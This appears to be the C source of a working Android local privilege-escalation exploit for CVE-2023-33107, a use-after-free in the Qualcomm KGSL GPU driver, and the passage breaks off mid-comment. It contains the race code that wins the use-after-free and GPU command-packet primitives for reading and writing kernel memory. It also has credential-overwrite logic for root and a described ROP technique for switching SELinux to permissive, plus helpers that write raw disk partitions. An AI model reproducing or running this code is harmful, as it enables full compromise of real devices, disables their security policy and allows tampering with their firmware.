/*
 * CVE-2023-33107 KGSL UAF root + SELinux permissive.
 * Exploit and the forged thread.cpu_context switch-in primitive: Risuntsy
 * (commit cdb4832 "feat: root + SELinux permissive by default
 * (forged thread.cpu_context)").
 * Based on Keto's CVE-2023-33107 KGSL UAF work.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <linux/capability.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/futex.h>
#include <sys/syscall.h>
#include <time.h>
#include "ko_loader.h"
#include "selinux_handoff.h"
#include "target_profile.h"

#ifndef MAP_FIXED_NOREPLACE
#define MAP_FIXED_NOREPLACE 0x100000
#endif
#ifndef MADV_DONTFORK
#define MADV_DONTFORK 10
#endif

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000UL
#endif
#define KGSL_IOC_TYPE 0x09
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_PREAMBLE      0x00000010
#define KGSL_CMDLIST_IB            0x00000001U
#define KGSL_TIMESTAMP_RETIRED     0x00000002
#define KGSL_MEMFLAGS_USE_CPU_MAP  0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR    0x00000002U

#define CP_NOP        0x10
#define CP_MEM_WRITE  0x3D
#define CP_MEM_TO_MEM 0x73

#define UAF_START      0x00000007001ff000ULL
#define UAF_SIZE       0x0000000010004000ULL
#define OVERLAP_START  0x00000007001fe000ULL
#define OVERLAP_SIZE   0x0000000000007000ULL
#define PLACEH_START   0x0000000710204000ULL
#define PLACEH_SIZE    0x0000000000010000ULL
#define BOGUS_START    0x0000000700204000ULL
#define WRAP_SIZE      0xffffffffffefd000ULL

#define MAX_CHILDREN 16384
#define CLEANUP_BATCH 64
#define MAX_TASK_CANDIDATES 64
#define SCAN_FAST_WORDS 64
#define SCAN_FULL_WORDS (PAGE_SIZE / 8)
#define SCAN_MAX_PAGES_PER_BATCH 2048
#define CRED_SCAN_PAGES_PER_BATCH 256
#define MAX_RACE_TRIES 20
#define RACE_MMAP_TRIES 65536
#define RACE_MMAP_BUDGET_US 50000
#define MAX_RACERS 4
#define SCAN_MAX_PAGES 65540
#define SCAN_FIRST_PAGE 1
#define KM_DUMP_BUFFER_SIZE 0x100000
#define IB_SIZE 0x1000000ULL

#define KERNEL_DS       UINT64_MAX
#define CRED_IDS_LEN    0x20
#define CRED_CAPS_LEN   0x18
#define CRED_WORDS      20

struct kgsl_gpuobj_alloc { uint64_t size, flags, va_len, mmapsize; unsigned int id, metadata_len; uint64_t metadata; };
struct kgsl_gpuobj_free { uint64_t flags, priv; unsigned int id, type, len; };
struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
struct kgsl_drawctxt_create { unsigned int flags, drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_command_object { uint64_t offset, gpuaddr, size; unsigned int flags, id; };
struct kgsl_gpu_command { uint64_t flags, cmdlist; unsigned int cmdsize, numcmds; uint64_t objlist; unsigned int objsize, numobjs; uint64_t synclist; unsigned int syncsize, numsyncs, context_id, timestamp; };
struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
struct kgsl_map_user_mem { int fd; unsigned long gpuaddr; size_t len, offset; unsigned long hostptr; unsigned int memtype, flags; };

#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct ctrl {
    pid_t pid;
    volatile int ready;
    volatile int action;
    volatile int error;
    volatile int root_done;
    volatile int root_stage;
    volatile int daemon_abort;
    volatile int sec_probe_cand;
    volatile int sec_probe_ready;
    volatile int sec_probe_result;
    volatile int sec_scan_stop;
    volatile uint64_t sec_fake_addr;   /* kernel VA of the forged security struct */
    char sec_ctx[128];
    int sec_errno[12];
};
struct found {
    uint64_t page;
    uint64_t cred;
    pid_t pid;
    int idx;
};

static struct ctrl *ctrls;
static int g_child_count = 4000;
static size_t g_pressure_bytes = 2560UL * 1024 * 1024;
static int g_racer_count = 1;
static int g_race_delay_us = -1;      /* < 0: sweep 0..measured ioctl time */
static int g_race_delay_fixed;
static int g_race_retry_ms = 200;
static int g_last_race_errno;
static int64_t g_last_ioctl_us;
static int g_pressure_hold;
static void *g_pressure_map;
static size_t g_pressure_size;
static volatile int race_go;
static int verbose = 1;
static const struct target_profile *g_target;
#define SEC_LOG_SIZE (64 * 1024)
static char *g_sec_log;
#define SEC_DUMP_SIZE (48u << 20)
#define SEC_DUMP_MAX 12
#define SEC_SID_SCAN_MAX 4096
struct sec_dump_hdr {
    volatile int done;
    volatile int count;
    struct { char name[16]; long long offset; long long size; } ent[SEC_DUMP_MAX];
};
static unsigned char *g_dump_buf;
static struct sec_dump_hdr *g_dump_hdr;

/* GPT parsing so a raw disk node (root/gpt block device) can stand in for
 * the per-partition by-name nodes when only the raw node is permitted. */
struct sec_gpt_ent { char name[40]; unsigned long long first, last; };
static int sec_gpt_lbs;
static struct sec_gpt_ent sec_gpt[128];
static int sec_gpt_count;

static int sec_gpt_load(int fd) {
    unsigned char buf[512 + 4096];
    int lbs = 0;
    for (int cand = 512; cand <= 4096; cand *= 8) {
        if (pread(fd, buf, sizeof buf, cand) < 92) continue;
        if (!memcmp(buf, "EFI PART", 8)) { lbs = cand; break; }
    }
    if (!lbs) return -1;
    unsigned long long ent_lba = 0;
    unsigned int nent = 0, esz = 0;
    memcpy(&ent_lba, buf + 0x48, 8);
    memcpy(&nent, buf + 0x50, 4);
    memcpy(&esz, buf + 0x54, 4);
    if (nent > 128) nent = 128;
    if (esz < 128 || esz > 4096) return -1;
    unsigned char ent[4096];
    if (esz > sizeof ent) return -1;
    sec_gpt_count = 0;
    for (unsigned int i = 0; i < nent; i++) {
        if (pread(fd, ent, esz, (long long)(ent_lba * (unsigned)lbs) +
                                      (long long)i * esz) != (ssize_t)esz)
            break;
        int zero = 1;
        for (int b = 0; b < 16; b++) if (ent[b]) { zero = 0; break; }
        if (zero) continue;
        unsigned long long f = 0, l = 0;
        memcpy(&f, ent + 0x20, 8);
        memcpy(&l, ent + 0x28, 8);
        char nm[40] = {0};
        for (int c = 0; c < 36; c++) {
            unsigned short u;
            memcpy(&u, ent + 0x38 + c * 2, 2);
            if (!u) break;
            nm[c] = (char)u;
        }
        snprintf(sec_gpt[sec_gpt_count].name, 40, "%s", nm);
        sec_gpt[sec_gpt_count].first = f;
        sec_gpt[sec_gpt_count].last = l;
        sec_gpt_count++;
    }
    sec_gpt_lbs = lbs;
    return sec_gpt_count > 0 ? 0 : -1;
}

static int g_sec_rawfd = -1;

/* Write a block of data into a partition.  Uses the by-name node when it is
 * reachable, otherwise the raw disk node with the GPT-derived offset. */
static long long sec_write_partition(const char *name, unsigned char *src,
                                     long long len, long long off) {
    char p[96];
    snprintf(p, sizeof p, "/dev/block/by-name/%s", name);
    int fd = open(p, O_WRONLY);
    if (fd >= 0) {
        if (off && lseek(fd, off, SEEK_SET) < 0) {
            int e = errno;
            close(fd);
            return -(e ? e : EIO);
        }
        ssize_t w = write(fd, src, (size_t)len);
        int e = errno;
        close(fd);
        return w == len ? (long long)w : -(e ? e : EIO);
    }
    if (g_sec_rawfd < 0) {
        static const char *raws[] = {"/dev/block/sda", "/dev/block/sdb",
                                      "/dev/block/sdc", NULL};
        for (int i = 0; raws[i]; i++) {
            int r = open(raws[i], O_RDWR);
            if (r < 0) continue;
            if (sec_gpt_load(r) == 0) {
                g_sec_rawfd = r;
                break;
            }
            close(r);
        }
    }
    if (g_sec_rawfd < 0)
        return -EACCES;
    for (int i = 0; i < sec_gpt_count; i++) {
        if (strcmp(sec_gpt[i].name, name))
            continue;
        long long base = (long long)sec_gpt[i].first * sec_gpt_lbs;
        ssize_t w = pwrite(g_sec_rawfd, src, (size_t)len, base + off);
        int e = errno;
        return w == len ? (long long)w : -(e ? e : EIO);
    }
    return -ENOENT;
}

static long long sec_dump_partition(const char *name, unsigned char *dst,
                                    long long cap) {
    char p[96];
    snprintf(p, sizeof p, "/dev/block/by-name/%s", name);
    int fd = open(p, O_RDONLY);
    long long total = 0;
    if (fd >= 0) {
        while (total < cap) {
            size_t want = (size_t)(cap - total);
            if (want > (1u << 20)) want = 1u << 20;
            ssize_t r = read(fd, dst + total, want);
            if (r <= 0) break;
            total += r;
        }
        close(fd);
        return total;
    }
    if (g_sec_rawfd < 0) {
        static const char *raws[] = {"/dev/block/sda", "/dev/block/sdb",
                                      "/dev/block/sdc", NULL};
        for (int i = 0; raws[i]; i++) {
            int r = open(raws[i], O_RDONLY);
            if (r < 0) continue;
            if (sec_gpt_load(r) == 0) {
                g_sec_rawfd = r;
                break;
            }
            close(r);
        }
    }
    if (g_sec_rawfd < 0)
        return -1;
    for (int i = 0; i < sec_gpt_count; i++) {
        if (strcmp(sec_gpt[i].name, name))
            continue;
        long long off = (long long)sec_gpt[i].first * sec_gpt_lbs;
        while (total < cap) {
            size_t want = (size_t)(cap - total);
            if (want > (1u << 20)) want = 1u << 20;
            ssize_t r = pread(g_sec_rawfd, dst + total, want, off + total);
            if (r <= 0) break;
            total += r;
        }
        return total;
    }
    return -2;
}
static cpu_set_t g_allowed_cpus;
static int g_affinity_captured;
static cpu_set_t g_park_mask;
static int g_park_cpu = -1;
static cpu_set_t g_race_mask;
static int g_race_cpu = -1;
static int futex_wait_int(volatile int *p, int val) { return (int)syscall(SYS_futex, (int *)p, FUTEX_WAIT, val, NULL, NULL, 0); }
static int futex_wake_int(volatile int *p) { return (int)syscall(SYS_futex, (int *)p, FUTEX_WAKE, 1, NULL, NULL, 0); }

/* Elapsed-time marks for measuring each stage of the setup. */
static int64_t now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (int64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}
static int64_t g_start_ms;
static void mark(const char *label) {
    printf("[t] %s +%lldms\n", label,
           (long long)(now_ms() - g_start_ms));
}
static int64_t now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (int64_t)ts.tv_sec * 1000000 + ts.tv_nsec / 1000;
}

/*
 * The overlap mmap has to land inside the kgsl_map_user_mem critical
 * section: too early and the mmap succeeds (which also destroys the bogus
 * hostptr mapping and invalidates the setup), too late and the ioctl is
 * already done.  Measure the ioctl once and sweep the delay over 0..that
 * duration on the retries instead of guessing a single value.
 */
static void race_delay_sleep(int us) {
    if (us <= 0) return;
    if (us <= 200) {
        int64_t deadline = now_us() + us;
        while (now_us() < deadline)
            __asm__ volatile("yield" ::: "memory");
        return;
    }
    struct timespec ts = { .tv_sec = us / 1000000,
                           .tv_nsec = (long)(us % 1000000) * 1000L };
    while (nanosleep(&ts, &ts) < 0 && errno == EINTR) {}
}
static int race_delay_for_try(int attempt) {
    static const int sweep_us[] = {
        0, 5, 10, 15, 20, 25, 30, 40, 50, 60,
        75, 90, 110, 140, 180, 230, 300, 400, 550, 750,
    };
    if (g_race_delay_fixed) return g_race_delay_us;
    if (g_last_ioctl_us > 0) {
        long long delay = g_last_ioctl_us * attempt / (MAX_RACE_TRIES - 1);
        if (delay > 100000) delay = 100000;
        return (int)delay;
    }
    return sweep_us[attempt % (int)(sizeof(sweep_us) / sizeof(sweep_us[0]))];
}

static void terminate_children_and_exit(int signal_number)
{
    if (ctrls && ctrls != MAP_FAILED) {
        for (int i = 0; i < g_child_count; i++) {
            pid_t pid = ctrls[i].pid;
            if (pid > 0)
                (void)kill(pid, SIGKILL);
        }
    }
    _exit(128 + signal_number);
}

static int install_child_cleanup_handlers(void)
{
    const int signals[] = {SIGTERM, SIGINT, SIGHUP};
    struct sigaction action;
    memset(&action, 0, sizeof(action));
    action.sa_handler = terminate_children_and_exit;
    sigemptyset(&action.sa_mask);
    for (size_t i = 0; i < sizeof(signals) / sizeof(signals[0]); i++) {
        if (sigaction(signals[i], &action, NULL) < 0)
            return -1;
    }
    return 0;
}

static int read_env_long(const char *name, long minimum, long maximum,
                         long *value) {
    const char *raw = getenv(name);
    if (!raw || !*raw) return 0;
    char *end = NULL;
    errno = 0;
    long parsed = strtol(raw, &end, 10);
    if (errno || end == raw || *end || parsed < minimum || parsed > maximum) {
        errno = EINVAL;
        return -1;
    }
    *value = parsed;
    return 1;
}

/*
 * Presence-based env switches are the wrong default here: root plus
 * permissive is what this build is for, so flags default to on and only an
 * explicit 0/no/off/false turns them off (SEC_PERMISSIVE=0, SEC_PERM_TRIGGER=0).
 */
static int env_flag(const char *name, int default_value) {
    const char *raw = getenv(name);
    if (!raw) return default_value;
    if (!*raw) return 1;
    if (!strcmp(raw, "0") || !strcasecmp(raw, "no") ||
        !strcasecmp(raw, "off") || !strcasecmp(raw, "false"))
        return 0;
    return 1;
}

static inline uint32_t parity(uint32_t v) {
    return (0x9669u >> (0xF & (v ^ (v >> 4) ^ (v >> 8) ^ (v >> 12) ^
                               (v >> 16) ^ (v >> 20) ^ (v >> 24) ^ (v >> 28)))) & 1u;
}
static inline uint32_t pkt(uint32_t op, uint32_t cnt) {
    return (7u << 28) | (cnt & 0x3fffu) | (parity(cnt) << 15) |
           ((op & 0x7fu) << 16) | (parity(op) << 23);
}
static inline void split64(uint64_t v, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)v; *hi = (uint32_t)(v >> 32);
}

static int kgsl_alloc(int fd, uint64_t size, unsigned *id, uint64_t *gpu, void **vma, uint64_t fixed) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) { perror("GPUOBJ_ALLOC"); return -1; }
    int flags = MAP_SHARED;
    void *want = NULL;
    if (fixed) { flags |= MAP_FIXED_NOREPLACE; want = (void *)(uintptr_t)fixed; }
    void *p = mmap(want, a.mmapsize, PROT_READ | PROT_WRITE, flags, fd, (off_t)a.id << 12);
    if (p == MAP_FAILED) { perror("mmap gpuobj"); ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &(struct kgsl_gpuobj_free){.id=a.id}); return -1; }
    struct kgsl_gpuobj_info info = { .id = a.id };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info) < 0) { perror("GPUOBJ_INFO"); munmap(p, a.mmapsize); ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &(struct kgsl_gpuobj_free){.id=a.id}); return -1; }
    *id = a.id; *gpu = info.gpuaddr; *vma = p;
    if (verbose) printf("[+] obj id=%u gpu=%llx mmap=%p size=%llu\n", a.id,
                        (unsigned long long)info.gpuaddr, p, (unsigned long long)a.mmapsize);
    return 0;
}
static void kgsl_free(int fd, unsigned id) {
    if (id) ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &(struct kgsl_gpuobj_free){.id=id});
}
static int kgsl_ctx(int fd, unsigned *ctx) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) { perror("DRAWCTXT_CREATE"); return -1; }
    *ctx = c.drawctxt_id; return 0;
}
static int kgsl_wait(int fd, unsigned ctx, unsigned target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 30000; i++) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) < 0) { perror("READTIMESTAMP"); return -1; }
        if (r.timestamp >= target) return 0;
        if (i < 1000) usleep(100); else usleep(1000);
    }
    fprintf(stderr, "[-] timestamp timeout %u/%u\n", r.timestamp, target);
    return -1;
}
static int kgsl_submit(int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma, size_t bytes) {
    __sync_synchronize();
    if (msync(ib_vma, bytes, MS_SYNC) < 0 && errno != ENODEV) { /* msync can fail on device mappings */ }
    struct kgsl_command_object obj = { .gpuaddr = ib_gpu, .size = bytes, .flags = KGSL_CMDLIST_IB, .id = ib_id };
    struct kgsl_gpu_command c = {0};
    c.cmdlist = (uint64_t)(uintptr_t)&obj; c.cmdsize = sizeof(obj); c.numcmds = 1; c.context_id = ctx;
    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) < 0) { perror("GPU_COMMAND"); return -1; }
    if (kgsl_wait(fd, ctx, c.timestamp) < 0) return -1;
    return 0;
}
static int gpu_read_words(int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
                          uint64_t ib_bytes, unsigned dump_id, uint64_t dump_gpu, void *dump_vma,
                          uint64_t src, uint32_t *out, int nwords) {
    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;
    cmd[dw++] = pkt(CP_NOP, 0);
    for (int i = 0; i < nwords; i++) {
        uint32_t dlo, dhi, slo, shi;
        split64(dump_gpu + (uint64_t)i * 4, &dlo, &dhi);
        split64(src + (uint64_t)i * 4, &slo, &shi);
        cmd[dw++] = pkt(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = dlo; cmd[dw++] = dhi;
        cmd[dw++] = slo; cmd[dw++] = shi;
    }
    cmd[dw++] = pkt(CP_NOP, 0);
    size_t bytes = (size_t)dw * 4;
    if (bytes > ib_bytes) return -1;
    if (kgsl_submit(fd, ctx, ib_id, ib_gpu, ib_vma, bytes) < 0) return -1;
    __sync_synchronize();
    if (msync(dump_vma, (size_t)nwords * 4, MS_SYNC | MS_INVALIDATE) < 0) { /* ignore */ }
    memcpy(out, dump_vma, (size_t)nwords * 4);
    return 0;
}
static int gpu_write_words(int fd, unsigned ctx, unsigned ib_id,
                           uint64_t ib_gpu, void *ib_vma, uint64_t ib_bytes,
                           uint64_t dst, const uint32_t *values, int nwords) {
    if (!values || nwords <= 0 || ib_bytes < 6 * sizeof(uint32_t)) {
        errno = EINVAL;
        return -1;
    }
    uint32_t *cmd = (uint32_t *)ib_vma;
    for (int i = 0; i < nwords; i++) {
        uint32_t lo, hi;
        split64(dst + (uint64_t)i * sizeof(uint32_t), &lo, &hi);
        cmd[0] = pkt(CP_NOP, 0);
        cmd[1] = pkt(CP_MEM_WRITE, 3);
        cmd[2] = lo;
        cmd[3] = hi;
        cmd[4] = values[i];
        cmd[5] = pkt(CP_NOP, 0);
        if (kgsl_submit(fd, ctx, ib_id, ib_gpu, ib_vma,
                        6 * sizeof(uint32_t)) < 0)
            return -1;
    }
    return 0;
}

struct race_arg {
    int fd;
    volatile int started;
    volatile int done;
    int64_t t0_us;
    int64_t t1_us;
    int ret;
    int err;
};

static void *bogus_racer(void *arg) {
    struct race_arg *ra = (struct race_arg *)arg;
    if (g_race_cpu >= 0) {
        pid_t tid = (pid_t)syscall(SYS_gettid);
        (void)syscall(SYS_sched_setaffinity, tid, sizeof(g_race_mask),
                        &g_race_mask);
    }
    while (!race_go) { }
    struct kgsl_map_user_mem req = {0};
    req.fd = -1;
    req.len = WRAP_SIZE;
    req.hostptr = BOGUS_START;
    req.memtype = KGSL_USER_MEM_TYPE_ADDR;
    req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    ra->t0_us = now_us();
    ra->started = 1;
    __sync_synchronize();
    int r = ioctl(ra->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    ra->t1_us = now_us();
    ra->ret = r;
    ra->err = errno;
    __sync_synchronize();
    ra->done = 1;
    return NULL;
}

static int race_once(int *out_fd, uint64_t *uaf_page) {
    g_last_race_errno = 0;
    int fd = open("/dev/kgsl-3d0", O_RDWR | O_NONBLOCK);
    if (fd < 0) { perror("open kgsl"); return -1; }
    unsigned uaf_id=0, overlap_id=0, ph_id=0;
    uint64_t uaf_gpu=0;
    void *uaf_vma=NULL, *overlap_vma=NULL, *ph_vma=NULL, *bogus_vma=NULL;
    uint64_t uaf_mmap_size=0, overlap_mmap_size=0, ph_mmap_size=0;

    struct kgsl_gpuobj_alloc a = { .size = UAF_SIZE, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
        if (errno == ENOMEM) g_last_race_errno = ENOMEM;
        perror("alloc uaf"); close(fd); return -1;
    }
    uaf_id = a.id; uaf_mmap_size = a.mmapsize;
    uaf_vma = mmap((void *)UAF_START, uaf_mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED_NOREPLACE, fd, (off_t)uaf_id<<12);
    if (uaf_vma == MAP_FAILED) { perror("mmap uaf"); goto fail; }
    if ((uint64_t)(uintptr_t)uaf_vma != UAF_START) { fprintf(stderr,"[-] uaf mmap at %p not fixed\n", uaf_vma); goto fail; }
    struct kgsl_gpuobj_info ui = { .id = uaf_id };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &ui) < 0) { perror("uaf info"); goto fail; }
    uaf_gpu = ui.gpuaddr;
    munmap(uaf_vma, uaf_mmap_size); uaf_vma = NULL;

    struct kgsl_gpuobj_alloc oa = { .size = OVERLAP_SIZE, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &oa) < 0) { perror("alloc overlap"); goto fail; }
    overlap_id = oa.id; overlap_mmap_size = oa.mmapsize;

    bogus_vma = mmap((void *)BOGUS_START, PAGE_SIZE*3, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);
    if (bogus_vma == MAP_FAILED) { perror("mmap bogus"); goto fail; }
    memset(bogus_vma, 0, PAGE_SIZE*3);

    struct kgsl_gpuobj_alloc pa = { .size = PLACEH_SIZE, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &pa) < 0) { perror("alloc placeholder"); goto fail; }
    ph_id = pa.id; ph_mmap_size = pa.mmapsize;
    ph_vma = mmap((void *)PLACEH_START, ph_mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED_NOREPLACE, fd, (off_t)ph_id<<12);
    if (ph_vma == MAP_FAILED) { perror("mmap placeholder"); goto fail; }
    if ((uint64_t)(uintptr_t)ph_vma != PLACEH_START) { fprintf(stderr,"[-] ph mmap not fixed\n"); goto fail; }
    struct kgsl_gpuobj_info pi = { .id = ph_id };
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &pi);

    struct race_arg ra[MAX_RACERS];
    pthread_t th[MAX_RACERS];
    int created = 0;
    memset(ra, 0, sizeof(ra));
    memset(th, 0, sizeof(th));
    race_go = 0;
    for (int i = 0; i < g_racer_count && i < MAX_RACERS; i++) {
        ra[i].fd = fd;
        if (pthread_create(&th[i], NULL, bogus_racer, &ra[i]) != 0) {
            perror("pthread");
            break;
        }
        created++;
    }
    race_go = 1;

    int mmap_err = 0;
    int won = 0;
    int mmap_enomem = 0;
    if (created > 0) {
        for (int spin = 0; spin < 2000000; spin++) {
            int any = 0;
            for (int i = 0; i < created; i++)
                if (ra[i].started) { any = 1; break; }
            if (any) break;
            __asm__ volatile("yield" ::: "memory");
        }
        int64_t budget_end = 0;
        for (int attempt = 0; attempt < RACE_MMAP_TRIES; attempt++) {
            if (attempt == 0) {
                race_delay_sleep(g_race_delay_us);
                budget_end = now_us() + RACE_MMAP_BUDGET_US;
            }
            errno = 0;
            overlap_vma = mmap((void *)OVERLAP_START, overlap_mmap_size,
                               PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
                               fd, (off_t)overlap_id<<12);
            mmap_err = errno;
            if (overlap_vma == MAP_FAILED && mmap_err == ENODEV) {
                won = 1;
                break;
            }
            if (overlap_vma == MAP_FAILED && mmap_err == ENOMEM)
                mmap_enomem = 1;
            if (overlap_vma != MAP_FAILED) {
                /* The overlap VMA has already replaced the first bogus
                 * hostptr page, so retrying this setup cannot hit the race
                 * cleanly; drop it and let the caller start a fresh round. */
                munmap(overlap_vma, overlap_mmap_size);
                overlap_vma = NULL;
                break;
            }
            int all_done = 1;
            for (int i = 0; i < created; i++)
                if (!ra[i].done) { all_done = 0; break; }
            if (all_done) break;
            if (now_us() > budget_end) break;
            __asm__ volatile("yield" ::: "memory");
        }
    }
    for (int i = 0; i < created; i++)
        pthread_join(th[i], NULL);

    int64_t ioctl_us = 0;
    int racer_enomem = 0;
    for (int i = 0; i < created; i++) {
        if (ra[i].ret != 0 && ra[i].err == ENOMEM)
            racer_enomem = 1;
        int64_t duration = ra[i].t1_us - ra[i].t0_us;
        if (duration > ioctl_us) ioctl_us = duration;
    }
    if (mmap_enomem || racer_enomem) g_last_race_errno = ENOMEM;
    /*
     * kgsl_map_user_mem normally fails with ENOMEM here (the huge bogus
     * range), but the time it spends in the driver is still the real
     * window.  Track the maximum: a jittering "latest" value makes the
     * sweep jump around and never cover the longer attempts.
     */
    if (ioctl_us >= 10 && ioctl_us > g_last_ioctl_us)
        g_last_ioctl_us = ioctl_us;
    if (verbose && ioctl_us >= 10)
        printf("[*] racer ioctl took %lldus (mmap delay %dus)\n",
               (long long)ioctl_us, g_race_delay_us);

    if (won) {
        printf("[!] RACE WON (uaf gpu=%llx)\n", (unsigned long long)uaf_gpu);
        struct kgsl_gpuobj_free fr = { .id = uaf_id };
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr) < 0) { perror("free uaf"); goto fail; }
        uaf_id = 0;
        if (overlap_vma != MAP_FAILED) { munmap(overlap_vma, overlap_mmap_size); overlap_vma = NULL; }
        if (ph_vma) { munmap(ph_vma, ph_mmap_size); ph_vma = NULL; }
        if (bogus_vma) { munmap(bogus_vma, PAGE_SIZE*3); bogus_vma = NULL; }
        kgsl_free(fd, overlap_id); kgsl_free(fd, ph_id);
        *out_fd = fd;
        *uaf_page = uaf_gpu;
        return 0;
    }
    printf("[-] race lost (mmap=%p errno=%d racer ret=%d errno=%d)\n",
           overlap_vma, mmap_err,
           created ? ra[0].ret : -1, created ? ra[0].err : 0);
fail:
    if (overlap_vma && overlap_vma != MAP_FAILED) munmap(overlap_vma, overlap_mmap_size);
    if (ph_vma) munmap(ph_vma, ph_mmap_size);
    if (bogus_vma) munmap(bogus_vma, PAGE_SIZE*3);
    if (uaf_vma) munmap(uaf_vma, uaf_mmap_size);
    kgsl_free(fd, uaf_id); kgsl_free(fd, overlap_id); kgsl_free(fd, ph_id);
    close(fd);
    return -1;
}

static int verify_effective_root(volatile int *stage) {
    if (stage) *stage = 1;
    uid_t uid = getuid();
    if (stage) *stage = 2;
    uid_t euid = geteuid();
    if (stage) *stage = 3;
    gid_t gid = getgid();
    if (stage) *stage = 4;
    gid_t egid = getegid();
    if (stage) *stage = 5;
    if (uid != 0 || euid != 0 || gid != 0 || egid != 0) {
        fprintf(stderr, "[-] credential IDs uid=%u euid=%u gid=%u egid=%u\n",
                (unsigned)uid, (unsigned)euid,
                (unsigned)gid, (unsigned)egid);
        errno = EPERM;
        return -1;
    }
    if (stage) *stage = 6;
    return 0;
}

static void move_selected_child_for_credential_read(void) {
    for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
        if (!CPU_ISSET(cpu, &g_allowed_cpus) || cpu == g_park_cpu) continue;
        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(cpu, &mask);
        if (sched_setaffinity(0, sizeof(mask), &mask) == 0) {
            for (int i = 0; i < 8; i++) syscall(SYS_sched_yield);
            return;
        }
    }
}

/*
 * Kernel write primitive: forged thread.cpu_context
 * -------------------------------------------------
 * The addr_limit/KERNEL_DS route cannot patch selinux_state on this device:
 * the SoC has no UAO (panic dumps show "pstate: ... -UAO"), so the arm64
 * uaccess helpers are patched to LDTR/STTR and any TTBR1 supervisor address
 * faults, even with addr_limit == KERNEL_DS.
 *
 * What does work is kernel control flow.  struct thread_struct lives inside
 * the reclaimed task_struct page and can be rewritten through the dangling
 * GPU mapping.  While the root child blocks in futex_wait, its saved
 * cpu_context.pc always holds _text + 0x89fc, the return address of
 * "bl cpu_switch_to" inside __switch_to - a self-validating KASLR leak.
 *
 * The parent then rewrites cpu_context for the next switch-in:
 *
 *   x19 = selinux_state         (store address)
 *   x20 = TARGET_SELINUX_WORD   (0x01000000: permissive, still initialised)
 *   sp  = task + 0xb70          (fpsimd vregs used as a tiny ROP stack)
 *   pc  = store gadget (0x427410 + slide)
 *
